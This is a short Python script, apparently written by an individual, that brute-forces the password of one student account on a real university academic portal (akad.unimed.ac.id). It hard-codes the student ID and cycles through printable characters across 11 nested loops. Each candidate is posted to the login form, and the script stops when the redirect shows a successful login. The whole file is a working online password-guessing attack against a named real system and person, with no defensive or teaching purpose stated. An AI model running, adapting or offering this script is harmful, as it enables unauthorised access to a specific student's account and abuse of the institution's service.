from ast import If
import asyncio
import requests
import aiohttp

text = list("akuhebat1}!")

def requestlogin(password):
    url = "https://akad.unimed.ac.id/index.php"
    header = {
    "Host" : "akad.unimed.ac.id",
    "User-Agent" : "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Mobile Safari/537.36"
    }
    payload = {
        "usid" : "4203250014",
        "pwd" : "akuhebat123",
        "role" : "s",
        "action" : "login",
    }
    payload["pwd"] = password
    x = requests.post(url, data=payload, headers=header)
    # print(x.url)
    if(x.url == "https://akad.unimed.ac.id/main.php"):
        return True

try:
    for i in range (ord(text[0]),126,1):
        text[0] = chr(i)
        for i in range (ord(text[1]),126,1):
            text[1] = chr(i)
            for i in range (ord(text[2]),126,1):
                text[2] = chr(i)
                for i in range (ord(text[3]),126,1):
                    text[3] = chr(i)
                    for i in range (ord(text[4]),126,1):
                        text[4] = chr(i)
                        for i in range (ord(text[5]),126,1):
                            text[5] = chr(i)
                            for i in range (ord(text[6]),126,1):
                                text[6] = chr(i)
                                for i in range (ord(text[7]),126,1):
                                    text[7] = chr(i)
                                    for i in range (ord(text[8]),126,1):
                                        text[8] = chr(i)
                                        for i in range (ord(text[9]),126,1):
                                            text[9] = chr(i)
                                            for i in range (ord(text[10]),126,1):
                                                text[10] = chr(i)
                                                passw = "".join(text)
                                                print(passw)
                                                if(requestlogin(passw)):
                                                    print(f"password adalah : {passw}")
                                                    raise StopIteration
                                            text[10] = chr(32)
                                        text[9] = chr(32)
                                    text[8] = chr(32)
                                text[7] = chr(32)
                            text[6] = chr(32)
                        text[5] = chr(32)
                    text[4] = chr(32)
                text[3] = chr(32)
            text[2] = chr(32)
        text[1] = chr(32)
    text[0] = chr(32)
except StopIteration:
    pass

